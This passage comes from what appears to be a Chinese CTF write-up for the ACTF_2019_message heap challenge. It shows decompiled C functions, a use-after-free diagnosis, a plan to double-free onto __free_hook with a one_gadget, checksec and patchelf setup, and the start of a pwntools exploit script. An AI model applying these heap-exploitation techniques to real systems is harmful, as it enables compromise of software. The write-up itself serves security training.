+</span><span class=lnt id=hl-16-6><a class=lnlinks href=#hl-16-6> 6</a>
+</span><span class=lnt id=hl-16-7><a class=lnlinks href=#hl-16-7> 7</a>
+</span><span class=lnt id=hl-16-8><a class=lnlinks href=#hl-16-8> 8</a>
+</span><span class=lnt id=hl-16-9><a class=lnlinks href=#hl-16-9> 9</a>
+</span><span class=lnt id=hl-16-10><a class=lnlinks href=#hl-16-10>10</a>
+</span><span class=lnt id=hl-16-11><a class=lnlinks href=#hl-16-11>11</a>
+</span><span class=lnt id=hl-16-12><a class=lnlinks href=#hl-16-12>12</a>
+</span><span class=lnt id=hl-16-13><a class=lnlinks href=#hl-16-13>13</a>
+</span><span class=lnt id=hl-16-14><a class=lnlinks href=#hl-16-14>14</a>
+</span><span class=lnt id=hl-16-15><a class=lnlinks href=#hl-16-15>15</a>
+</span><span class=lnt id=hl-16-16><a class=lnlinks href=#hl-16-16>16</a>
+</span><span class=lnt id=hl-16-17><a class=lnlinks href=#hl-16-17>17</a>
+</span><span class=lnt id=hl-16-18><a class=lnlinks href=#hl-16-18>18</a>
+</span><span class=lnt id=hl-16-19><a class=lnlinks href=#hl-16-19>19</a>
+</span><span class=lnt id=hl-16-20><a class=lnlinks href=#hl-16-20>20</a>
+</span><span class=lnt id=hl-16-21><a class=lnlinks href=#hl-16-21>21</a>
+</span><span class=lnt id=hl-16-22><a class=lnlinks href=#hl-16-22>22</a>
+</span><span class=lnt id=hl-16-23><a class=lnlinks href=#hl-16-23>23</a>
+</span><span class=lnt id=hl-16-24><a class=lnlinks href=#hl-16-24>24</a>
+</span><span class=lnt id=hl-16-25><a class=lnlinks href=#hl-16-25>25</a>
+</span><span class=lnt id=hl-16-26><a class=lnlinks href=#hl-16-26>26</a>
+</span><span class=lnt id=hl-16-27><a class=lnlinks href=#hl-16-27>27</a>
+</span><span class=lnt id=hl-16-28><a class=lnlinks href=#hl-16-28>28</a>
+</span><span class=lnt id=hl-16-29><a class=lnlinks href=#hl-16-29>29</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=nf>sub_400B73</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-24h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>24</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>counts</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;There is no message in system&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please input index of message you want to delete:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mi>9</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Index is invalid!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>free</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)</span><span class=o>&amp;</span><span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>      <span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=o>--</span><span class=n>counts</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>edit</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-17-1><a class=lnlinks href=#hl-17-1> 1</a>
+</span><span class=lnt id=hl-17-2><a class=lnlinks href=#hl-17-2> 2</a>
+</span><span class=lnt id=hl-17-3><a class=lnlinks href=#hl-17-3> 3</a>
+</span><span class=lnt id=hl-17-4><a class=lnlinks href=#hl-17-4> 4</a>
+</span><span class=lnt id=hl-17-5><a class=lnlinks href=#hl-17-5> 5</a>
+</span><span class=lnt id=hl-17-6><a class=lnlinks href=#hl-17-6> 6</a>
+</span><span class=lnt id=hl-17-7><a class=lnlinks href=#hl-17-7> 7</a>
+</span><span class=lnt id=hl-17-8><a class=lnlinks href=#hl-17-8> 8</a>
+</span><span class=lnt id=hl-17-9><a class=lnlinks href=#hl-17-9> 9</a>
+</span><span class=lnt id=hl-17-10><a class=lnlinks href=#hl-17-10>10</a>
+</span><span class=lnt id=hl-17-11><a class=lnlinks href=#hl-17-11>11</a>
+</span><span class=lnt id=hl-17-12><a class=lnlinks href=#hl-17-12>12</a>
+</span><span class=lnt id=hl-17-13><a class=lnlinks href=#hl-17-13>13</a>
+</span><span class=lnt id=hl-17-14><a class=lnlinks href=#hl-17-14>14</a>
+</span><span class=lnt id=hl-17-15><a class=lnlinks href=#hl-17-15>15</a>
+</span><span class=lnt id=hl-17-16><a class=lnlinks href=#hl-17-16>16</a>
+</span><span class=lnt id=hl-17-17><a class=lnlinks href=#hl-17-17>17</a>
+</span><span class=lnt id=hl-17-18><a class=lnlinks href=#hl-17-18>18</a>
+</span><span class=lnt id=hl-17-19><a class=lnlinks href=#hl-17-19>19</a>
+</span><span class=lnt id=hl-17-20><a class=lnlinks href=#hl-17-20>20</a>
+</span><span class=lnt id=hl-17-21><a class=lnlinks href=#hl-17-21>21</a>
+</span><span class=lnt id=hl-17-22><a class=lnlinks href=#hl-17-22>22</a>
+</span><span class=lnt id=hl-17-23><a class=lnlinks href=#hl-17-23>23</a>
+</span><span class=lnt id=hl-17-24><a class=lnlinks href=#hl-17-24>24</a>
+</span><span class=lnt id=hl-17-25><a class=lnlinks href=#hl-17-25>25</a>
+</span><span class=lnt id=hl-17-26><a class=lnlinks href=#hl-17-26>26</a>
+</span><span class=lnt id=hl-17-27><a class=lnlinks href=#hl-17-27>27</a>
+</span><span class=lnt id=hl-17-28><a class=lnlinks href=#hl-17-28>28</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=nf>edit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-24h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>24</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>counts</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;No message can you edit&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please input index of message you want to edit:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=n>idx</span> <span class=o>&lt;=</span> <span class=mi>9</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Now you can edit the message:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)</span><span class=o>&amp;</span><span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>],</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Index is invalid!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>display</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-18-1><a class=lnlinks href=#hl-18-1> 1</a>
+</span><span class=lnt id=hl-18-2><a class=lnlinks href=#hl-18-2> 2</a>
+</span><span class=lnt id=hl-18-3><a class=lnlinks href=#hl-18-3> 3</a>
+</span><span class=lnt id=hl-18-4><a class=lnlinks href=#hl-18-4> 4</a>
+</span><span class=lnt id=hl-18-5><a class=lnlinks href=#hl-18-5> 5</a>
+</span><span class=lnt id=hl-18-6><a class=lnlinks href=#hl-18-6> 6</a>
+</span><span class=lnt id=hl-18-7><a class=lnlinks href=#hl-18-7> 7</a>
+</span><span class=lnt id=hl-18-8><a class=lnlinks href=#hl-18-8> 8</a>
+</span><span class=lnt id=hl-18-9><a class=lnlinks href=#hl-18-9> 9</a>
+</span><span class=lnt id=hl-18-10><a class=lnlinks href=#hl-18-10>10</a>
+</span><span class=lnt id=hl-18-11><a class=lnlinks href=#hl-18-11>11</a>
+</span><span class=lnt id=hl-18-12><a class=lnlinks href=#hl-18-12>12</a>
+</span><span class=lnt id=hl-18-13><a class=lnlinks href=#hl-18-13>13</a>
+</span><span class=lnt id=hl-18-14><a class=lnlinks href=#hl-18-14>14</a>
+</span><span class=lnt id=hl-18-15><a class=lnlinks href=#hl-18-15>15</a>
+</span><span class=lnt id=hl-18-16><a class=lnlinks href=#hl-18-16>16</a>
+</span><span class=lnt id=hl-18-17><a class=lnlinks href=#hl-18-17>17</a>
+</span><span class=lnt id=hl-18-18><a class=lnlinks href=#hl-18-18>18</a>
+</span><span class=lnt id=hl-18-19><a class=lnlinks href=#hl-18-19>19</a>
+</span><span class=lnt id=hl-18-20><a class=lnlinks href=#hl-18-20>20</a>
+</span><span class=lnt id=hl-18-21><a class=lnlinks href=#hl-18-21>21</a>
+</span><span class=lnt id=hl-18-22><a class=lnlinks href=#hl-18-22>22</a>
+</span><span class=lnt id=hl-18-23><a class=lnlinks href=#hl-18-23>23</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=nf>display</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-24h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>24</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>counts</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;No message in system&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please input index of message you want to display:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=n>idx</span> <span class=o>&lt;=</span> <span class=mi>9</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;The message: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=p>)</span><span class=o>&amp;</span><span class=n>list</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Index is invalid!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>经过简单的分析发现程序 free 之后没有置空指针存在 UAF 漏洞<br>程序名提示我们使用 double free 来解题<br>我们考虑使用 double free 拿到 __free_hook 然后写入 one_gadget</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-19-1><a class=lnlinks href=#hl-19-1> 1</a>
+</span><span class=lnt id=hl-19-2><a class=lnlinks href=#hl-19-2> 2</a>
+</span><span class=lnt id=hl-19-3><a class=lnlinks href=#hl-19-3> 3</a>
+</span><span class=lnt id=hl-19-4><a class=lnlinks href=#hl-19-4> 4</a>
+</span><span class=lnt id=hl-19-5><a class=lnlinks href=#hl-19-5> 5</a>
+</span><span class=lnt id=hl-19-6><a class=lnlinks href=#hl-19-6> 6</a>
+</span><span class=lnt id=hl-19-7><a class=lnlinks href=#hl-19-7> 7</a>
+</span><span class=lnt id=hl-19-8><a class=lnlinks href=#hl-19-8> 8</a>
+</span><span class=lnt id=hl-19-9><a class=lnlinks href=#hl-19-9> 9</a>
+</span><span class=lnt id=hl-19-10><a class=lnlinks href=#hl-19-10>10</a>
+</span><span class=lnt id=hl-19-11><a class=lnlinks href=#hl-19-11>11</a>
+</span><span class=lnt id=hl-19-12><a class=lnlinks href=#hl-19-12>12</a>
+</span><span class=lnt id=hl-19-13><a class=lnlinks href=#hl-19-13>13</a>
+</span><span class=lnt id=hl-19-14><a class=lnlinks href=#hl-19-14>14</a>
+</span><span class=lnt id=hl-19-15><a class=lnlinks href=#hl-19-15>15</a>
+</span><span class=lnt id=hl-19-16><a class=lnlinks href=#hl-19-16>16</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  ACTF_2019_message ls
+</span></span><span class=line><span class=cl>ACTF_2019_message
+</span></span><span class=line><span class=cl>➜  ACTF_2019_message chmod +x ./ACTF_2019_message
+</span></span><span class=line><span class=cl>➜  ACTF_2019_message pwn checksec ./ACTF_2019_message 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/work/ACTF_2019_message/ACTF_2019_message&#39;</span>
+</span></span><span class=line><span class=cl>    Arch:       amd64-64-little
+</span></span><span class=line><span class=cl>    RELRO:      Full RELRO
+</span></span><span class=line><span class=cl>    Stack:      Canary found
+</span></span><span class=line><span class=cl>    NX:         NX enabled
+</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x3fd000<span class=o>)</span>
+</span></span><span class=line><span class=cl>➜  ACTF_2019_message patchelf --replace-needed libc.so.6 ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 ./ACTF_2019_message
+</span></span><span class=line><span class=cl>➜  ACTF_2019_message patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./ACTF_2019_message
+</span></span><span class=line><span class=cl>➜  ACTF_2019_message ldd ./ACTF_2019_message
+</span></span><span class=line><span class=cl>        linux-vdso.so.1 <span class=o>(</span>0x00007ffce2bb7000<span class=o>)</span>
+</span></span><span class=line><span class=cl>        /home/lhon901/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 <span class=o>(</span>0x00007f04ba800000<span class=o>)</span>
+</span></span><span class=line><span class=cl>        /home/lhon901/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so <span class=o>=</span>&gt; /lib64/ld-linux-x86-64.so.2 <span class=o>(</span>0x00007f04badc5000<span class=o>)</span></span></span></code></pre></td></tr></table></div></div><p>首先编写模板:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-20-1><a class=lnlinks href=#hl-20-1> 1</a>
+</span><span class=lnt id=hl-20-2><a class=lnlinks href=#hl-20-2> 2</a>
+</span><span class=lnt id=hl-20-3><a class=lnlinks href=#hl-20-3> 3</a>
+</span><span class=lnt id=hl-20-4><a class=lnlinks href=#hl-20-4> 4</a>
+</span><span class=lnt id=hl-20-5><a class=lnlinks href=#hl-20-5> 5</a>
+</span><span class=lnt id=hl-20-6><a class=lnlinks href=#hl-20-6> 6</a>
+</span><span class=lnt id=hl-20-7><a class=lnlinks href=#hl-20-7> 7</a>
+</span><span class=lnt id=hl-20-8><a class=lnlinks href=#hl-20-8> 8</a>
+</span><span class=lnt id=hl-20-9><a class=lnlinks href=#hl-20-9> 9</a>
+</span><span class=lnt id=hl-20-10><a class=lnlinks href=#hl-20-10>10</a>
+</span><span class=lnt id=hl-20-11><a class=lnlinks href=#hl-20-11>11</a>
+</span><span class=lnt id=hl-20-12><a class=lnlinks href=#hl-20-12>12</a>
+</span><span class=lnt id=hl-20-13><a class=lnlinks href=#hl-20-13>13</a>
+</span><span class=lnt id=hl-20-14><a class=lnlinks href=#hl-20-14>14</a>
+</span><span class=lnt id=hl-20-15><a class=lnlinks href=#hl-20-15>15</a>
+</span><span class=lnt id=hl-20-16><a class=lnlinks href=#hl-20-16>16</a>
+</span><span class=lnt id=hl-20-17><a class=lnlinks href=#hl-20-17>17</a>
+</span><span class=lnt id=hl-20-18><a class=lnlinks href=#hl-20-18>18</a>
+</span><span class=lnt id=hl-20-19><a class=lnlinks href=#hl-20-19>19</a>
+</span><span class=lnt id=hl-20-20><a class=lnlinks href=#hl-20-20>20</a>
+</span><span class=lnt id=hl-20-21><a class=lnlinks href=#hl-20-21>21</a>
+</span><span class=lnt id=hl-20-22><a class=lnlinks href=#hl-20-22>22</a>
+</span><span class=lnt id=hl-20-23><a class=lnlinks href=#hl-20-23>23</a>
+</span><span class=lnt id=hl-20-24><a class=lnlinks href=#hl-20-24>24</a>
+</span><span class=lnt id=hl-20-25><a class=lnlinks href=#hl-20-25>25</a>
+</span><span class=lnt id=hl-20-26><a class=lnlinks href=#hl-20-26>26</a>
+</span><span class=lnt id=hl-20-27><a class=lnlinks href=#hl-20-27>27</a>
+</span><span class=lnt id=hl-20-28><a class=lnlinks href=#hl-20-28>28</a>
+</span><span class=lnt id=hl-20-29><a class=lnlinks href=#hl-20-29>29</a>
+</span><span class=lnt id=hl-20-30><a class=lnlinks href=#hl-20-30>30</a>
+</span><span class=lnt id=hl-20-31><a class=lnlinks href=#hl-20-31>31</a>
+</span><span class=lnt id=hl-20-32><a class=lnlinks href=#hl-20-32>32</a>
+</span><span class=lnt id=hl-20-33><a class=lnlinks href=#hl-20-33>33</a>
+</span><span class=lnt id=hl-20-34><a class=lnlinks href=#hl-20-34>34</a>
+</span><span class=lnt id=hl-20-35><a class=lnlinks href=#hl-20-35>35</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ACTF_2019_message&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./ACTF_2019_message&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;/home/lhon901/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choice</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;choice: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span> <span class=n>message</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Please input the length of message:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Please input the message:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index of message you want to delete:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>message</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index of message you want to edit:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Now you can edit the message:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>display</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index of message you want to display:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;The message: &#39;</span><span class=p>)</span>
